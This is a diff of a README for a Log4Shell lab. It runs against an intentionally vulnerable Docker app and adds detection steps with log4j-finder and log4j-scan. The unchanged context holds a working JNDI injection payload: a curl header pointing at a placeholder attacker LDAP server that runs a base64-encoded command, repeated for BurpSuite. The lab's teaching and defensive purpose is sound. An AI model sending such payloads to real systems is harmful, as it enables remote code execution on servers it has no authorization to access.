@@ -85,6 +85,8 @@ This tells you that the server is vulnerable to the exploit.
 
 We will be using a tool called [JNDIExploit](http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream) to exploit the server. This program contains a "`LDAP` & `HTTP` servers for exploiting insecure-by-default `Java JNDI API`". There is a `JAR` file provided in this repo called `LDAP-Server.jar` to run it, use the following command as a template to run the `LDAP` server: 
 
+> 
+
 ```sh
 java -jar LDAP-Server.jar -i YOUR_IP -p 8888
 ```
@@ -101,8 +103,9 @@ For example the following command will add a file called `pwned` to the `/tmp` d
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
 ```
 
-> ℹ️ **NOTE** 
-> **NOTE:** This can also be used *BurpSuite* by adding the following line to the origal reqest: 
+> 📘 **NOTE** 
+>
+> This can also be used *BurpSuite* by adding the following line to the origal reqest: 
 > ```http
 > X-Api-Version: ${jndi:ldap://LDAP_SERVER_IP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
 > ```
@@ -116,22 +119,59 @@ The process we just did was very manual but a bot can easily be set up to do thi
 
 One of the best resources for *Log4J* is [`NCSC-NL/log4shell` GitHub Page](https://github.com/NCSC-NL/log4shell). It contains detailed documentation on: 
 
-- Hunting
-- Indicators of Compromise
-- Detection & Mitigation
-- Scanning 
-- Known Vulnerable Software
-- Parsing Tools
+- [Hunting](https://github.com/NCSC-NL/log4shell/blob/main/hunting/README.md)
+- [Indicators of Compromise](https://github.com/NCSC-NL/log4shell/blob/main/iocs/README.md)
+- [Detection & Mitigation](https://github.com/NCSC-NL/log4shell/blob/main/detection_mitigation/README.md)
+- [Scanning](https://github.com/NCSC-NL/log4shell/blob/main/scanning/README.md)
+- [Known Vulnerable Software](https://github.com/NCSC-NL/log4shell/blob/main/software/README.md)
+- [Parsing Tools](https://github.com/NCSC-NL/log4shell/blob/main/tools/README.md)
 
 We will be using 2 tools mentioned in this repository. 
 
 ### 1. [log4j-finder](https://github.com/fox-it/log4j-finder)
 
-[log4j-finder](https://github.com/fox-it/log4j-finder) "identifies `log4j2` libraries on your filesystem using a list of *known bad* and *known good* MD5 hashes of specific files". This means that it runs locally on the machine instead of scanning externally. To scan for the Log4J vulnerability, you will have to get into a termail of the docker container. While the container is running, use the following command: 
+[log4j-finder](https://github.com/fox-it/log4j-finder) "identifies `log4j2` libraries on your filesystem using a list of *known bad* and *known good* MD5 hashes of specific files". This means that it runs locally on the machine instead of scanning externally. To scan for the Log4J vulnerability, you will have to get into a termial of the docker container. While the container is running, use the following command: 
 
 ```sh
+docker exec -it vulnerable-app /bin/sh
+```
+
+Once you are in, you need to install `git` and `python3`:
+
+```sh
+apk add git python3
+```
+
+Then clone the repo and run the program: 
+
+```sh
+git clone https://github.com/fox-it/log4j-finder
+cd log4j-finder
+python3 log4j-finder.py / 
+```
+
+This will scan the entire system for any vulerable packages. You should see an output similar to this after running it in the docker containter: 
 
 ```
+[2022-11-21 06:13:58] 8a6cfd959a94 Scanning: /
+[2022-11-21 06:13:59] 8a6cfd959a94 VULNERABLE: /app/spring-boot-application.jar -> BOOT-INF/lib/log4j-core-2.14.1.jar -> org/apache/logging/log4j/core/net/JndiManager.class [f1d630c48928096a484e4b95ccb162a0: log4j 2.14.0 - 2.14.1]
+[2022-11-21 06:13:59] 8a6cfd959a94 Finished scan, elapsed time: 0.91 seconds
+
+Summary:
+ Processed 51797 files and 5750 directories
+ Scanned 23 files
+  Found 1 vulnerable files
+```
+
+### 2. [log4j-scan](https://github.com/fullhunt/log4j-scan) 
+
+This tool can be used to exterally scan for *Log4J*. It is an "open detection and scanning tool (Python) for discovering and fuzzing for Log4J vulnerability". Due to it's ability to scan many devices it's perfect for security professionals who manage large scale opperations.  
+
+> 🚧 Bug in Code 
+>
+> As outlined in [Issue #131}(https://github.com/fullhunt/log4j-scan/issues/131), if you run the version directly from the GitHub page it will fail to run. Due to this, I have included the fix (changeing `interact.sh` to `oast.fun`) in this repo named `./log4j-scan.py`. Thank you [akr3ch](https://github.com/akr3ch) for figuring this out. 
+
+
 
 ## Log4J Vulnerable Code Explained
 
@@ -154,10 +194,6 @@ We will be using 2 tools mentioned in this repository.
 ### Honorable Mentions 
 
 - 
-
-> 👍 Success
-> 
-> Vitae reprehenderit at aliquid error voluptates eum dignissimos.
 
 [^1]: [Docker container created by christophetd](https://github.com/christophetd/log4shell-vulnerabre-app) 
 [^2]: [Ten families of malicious samples are spreading using the Log4j2 vulnerability Now](https://blog.netlab.360.com/ten-families-of-malicious-samples-are-spreading-using-the-log4j2-vulnerability-now/) 
